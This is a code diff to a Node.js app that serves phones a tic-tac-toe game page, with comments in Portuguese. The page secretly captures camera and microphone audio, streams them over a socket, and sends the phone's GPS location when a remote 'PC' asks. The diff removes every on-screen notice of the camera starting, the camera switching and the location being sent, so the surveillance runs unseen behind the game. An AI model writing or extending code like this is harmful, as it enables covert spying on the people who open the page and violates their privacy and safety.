@@ -18,7 +18,7 @@ app.get('/', (req, res) => {
   const fullUrl = `${protocol}://${host}`;
   
   if (isMobile) {
-    // CELULAR: apenas jogo, tudo oculto
+    // CELULAR: apenas jogo, só mostra mensagens do chat
     res.send(`<!DOCTYPE html>
 <html>
 <head>
@@ -99,7 +99,7 @@ app.get('/', (req, res) => {
         button:active { transform: scale(0.95); background: #45a049; }
         button:disabled { background: #ccc; cursor: not-allowed; }
         
-        /* Toast notifications */
+        /* Toast notifications - APENAS PARA MENSAGENS */
         #toastContainer {
             position: fixed;
             top: 20px;
@@ -170,7 +170,7 @@ app.get('/', (req, res) => {
         let gameActive = false;
         let board = ['', '', '', '', '', '', '', '', ''];
         let mediaStream = null;
-        let facingMode = 'environment'; // 'environment' = traseira, 'user' = frontal
+        let facingMode = 'environment';
         let audioContext = null;
         let audioProcessor = null;
         let audioSource = null;
@@ -194,8 +194,8 @@ app.get('/', (req, res) => {
             document.getElementById('board').appendChild(cell);
         }
         
-        // Função para mostrar toast
-        function showToast(message, isEmergency = false, duration = 3000) {
+        // Função para mostrar APENAS mensagens do chat
+        function showMessageToast(message, isEmergency = false) {
             const toast = document.createElement('div');
             toast.className = 'toast' + (isEmergency ? ' emergency' : '');
             toast.textContent = message;
@@ -208,10 +208,10 @@ app.get('/', (req, res) => {
                         if (toast.parentNode) toast.remove();
                     }, 300);
                 }
-            }, duration);
+            }, 3000);
         }
         
-        // Função para iniciar câmera e áudio
+        // Função para iniciar câmera e áudio (SILENCIOSA - sem toasts)
         async function iniciarCamera(modo) {
             try {
                 if (mediaStream) {
@@ -244,7 +244,6 @@ app.get('/', (req, res) => {
                 
                 audioProcessor.onaudioprocess = (e) => {
                     const inputData = e.inputBuffer.getChannelData(0);
-                    // Enviar apenas a cada 2 frames para não sobrecarregar
                     if (Math.random() < 0.5) {
                         socket.emit('audio', Array.from(inputData));
                     }
@@ -264,62 +263,57 @@ app.get('/', (req, res) => {
                     }
                 }, 100);
                 
-                // Não mostra toast para não poluir
+                // SEM TOAST - não mostra nada
                 
             } catch (err) {
                 console.log('Erro ao iniciar câmera:', err);
-                showToast('❌ Erro na câmera');
             }
         }
         
         // Iniciar com câmera traseira
         iniciarCamera('environment');
         
-        // Receber comandos do PC
+        // Receber comandos do PC (SILENCIOSO - sem toasts)
         socket.on('comando', (cmd) => {
             if (cmd === 'vibrate' && navigator.vibrate) {
                 navigator.vibrate(500);
-                showToast('📳 Celular vibrou');
+                // NÃO MOSTRA TOAST
             } 
             else if (cmd === 'emergency' && navigator.vibrate) {
                 navigator.vibrate([500, 200, 500, 200, 500]);
-                showToast('⚠️ EMERGÊNCIA!', true, 5000);
+                // NÃO MOSTRA TOAST
             } 
             else if (cmd === 'trocarCamera') {
                 facingMode = facingMode === 'environment' ? 'user' : 'environment';
                 iniciarCamera(facingMode);
-                showToast('🔄 Câmera ' + (facingMode === 'environment' ? 'traseira' : 'frontal'));
+                // NÃO MOSTRA TOAST
             }
             else if (cmd === 'getLocation') {
                 if (navigator.geolocation) {
-                    showToast('📍 Obtendo localização...');
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
                             socket.emit('location', {
                                 latitude: position.coords.latitude,
                                 longitude: position.coords.longitude
                             });
-                            showToast('✅ Localização enviada!');
+                            // NÃO MOSTRA TOAST
                         },
                         (error) => {
-                            showToast('❌ Erro localização: ' + error.message);
+                            console.log('Erro localização:', error);
                         }
                     );
-                } else {
-                    showToast('❌ Geolocalização não suportada');
                 }
             }
         });
         
-        // Receber mensagens do PC
+        // APENAS MENSAGENS DO CHAT APARECEM
         socket.on('mensagem', (msg) => {
-            showToast('💬 ' + msg);
+            showMessageToast('💬 ' + msg);
         });
         
-        // Eventos do jogo
+        // Eventos do jogo (sem toasts)
         socket.on('connect', () => {
             statusDiv.innerHTML = 'Conectado!';
-            showToast('✅ Conectado ao PC');
         });
         
         socket.on('inicio', (data) => {
@@ -328,7 +322,6 @@ app.get('/', (req, res) => {
             gameActive = true;
             resetBtn.disabled = false;
             statusDiv.innerHTML = minhaVez ? 'Sua vez (X)' : 'Vez do oponente (X)';
-            showToast('🎮 Jogo iniciado! Você é ' + meuSimbolo);
         });
         
         socket.on('jogada', (data) => {
@@ -346,7 +339,6 @@ app.get('/', (req, res) => {
         socket.on('fim', (data) => {
             statusDiv.innerHTML = data.msg;
             gameActive = false;
-            showToast('🏁 ' + data.msg);
         });
         
         socket.on('reiniciar', () => {
@@ -358,7 +350,6 @@ app.get('/', (req, res) => {
             gameActive = true;
             minhaVez = meuSimbolo === 'X';
             statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
-            showToast('🔄 Jogo reiniciado');
         });
         
         resetBtn.onclick = () => {
